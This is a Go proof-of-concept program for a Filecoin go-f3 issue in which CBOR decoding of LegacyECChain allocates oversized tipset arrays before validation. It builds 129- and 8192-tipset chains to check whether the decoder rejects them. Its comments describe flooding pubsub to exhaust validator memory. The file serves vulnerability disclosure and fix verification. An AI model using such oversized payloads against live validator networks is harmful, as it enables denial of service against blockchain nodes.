package main

// PoC for Filecoin go-f3 issue: LegacyECChain CBOR decode accepts lengths above ChainMaxLen
// This demonstrates DoS via oversized allocation before validation.
// See https://github.com/filecoin-project/go-f3/issues/1081
//
// Before fix: UnmarshalCBOR allows up to 8192 tipsets, allocates make([]TipSet, extra) with extra=129,
// then Validate() rejects "chain too long" – but allocation already happened, causing high compute/memory.
// After fix: UnmarshalCBOR rejects extra > ChainMaxLen (128) before allocation.
//
// Impact: High compute consumption by validator nodes, potential DoS of >30% validators
// if attacker floods pubsub with oversized chains.

import (
	"bytes"
	"fmt"
	"github.com/filecoin-project/go-f3/gpbft"
	"github.com/ipfs/go-cid"
)

func main() {
	fmt.Println("[1] Building LegacyECChain with ChainMaxLen+1 tipsets (129)")
	chain := make(gpbft.LegacyECChain, gpbft.ChainMaxLen+1)
	ptCid := cid.Undef
	// Use a dummy CID for power table
	// In real attack, attacker would craft valid CIDs and keys, but for PoC we use minimal valid TipSets
	for i := 0; i < len(chain); i++ {
		chain[i] = gpbft.TipSet{
			Epoch:      int64(i),
			Key:        []byte{byte(i)},
			PowerTable: ptCid,
		}
		chain[i].Commitments = [32]byte{}
	}

	// Marshal
	var buf bytes.Buffer
	if err := chain.MarshalCBOR(&buf); err != nil {
		fmt.Printf("Marshal failed (expected after fix if we enforce Marshal limit): %v\n", err)
		fmt.Println("Result: Marshal correctly rejects oversized chain -> DoS prevented at encode time")
		return
	}
	fmt.Printf("Marshaled %d bytes for chain len %d\n", buf.Len(), len(chain))

	// Try to unmarshal into ECChain (which calls LegacyECChain.UnmarshalCBOR)
	var ecChain gpbft.ECChain
	err := ecChain.UnmarshalCBOR(bytes.NewReader(buf.Bytes()))
	if err != nil {
		fmt.Printf("[2] Unmarshal correctly rejected: %v\n", err)
		fmt.Println("Result: Fix works – oversized chain rejected BEFORE allocation, no DoS")
	} else {
		fmt.Printf("[2] Unmarshal SUCCEEDED (vulnerable): decoded len=%d\n", ecChain.Len())
		if err := ecChain.Validate(); err != nil {
			fmt.Printf("Validate rejects: %v\n", err)
			fmt.Println("VULNERABILITY: Allocated memory for 129 TipSets before validation – attacker can cause high compute/memory")
			fmt.Println("An attacker can flood pubsub with chains of len 8192, each allocating ~6MB+ before validation,")
			fmt.Println("leading to high compute consumption and potential OOM of validator nodes.")
		}
	}

	// Also test max allowed 8192 (old limit)
	fmt.Println("\n[3] Testing old limit 8192 (should be rejected now)")
	hugeChain := make(gpbft.LegacyECChain, 8192)
	for i := 0; i < len(hugeChain); i++ {
		hugeChain[i] = gpbft.TipSet{
			Epoch:      int64(i),
			Key:        []byte{byte(i % 256)},
			PowerTable: ptCid,
		}
	}
	var buf2 bytes.Buffer
	if err := hugeChain.MarshalCBOR(&buf2); err != nil {
		fmt.Printf("Marshal of 8192 correctly rejected: %v\n", err)
	} else {
		var ec2 gpbft.ECChain
		if err := ec2.UnmarshalCBOR(bytes.NewReader(buf2.Bytes())); err != nil {
			fmt.Printf("Unmarshal of 8192 correctly rejected: %v\n", err)
		} else {
			fmt.Printf("VULNERABLE: 8192 chain decoded, len=%d – massive allocation!\n", ec2.Len())
		}
	}

	fmt.Println("\nPoC complete: If unmarshal rejects >128, fix is effective.")
}
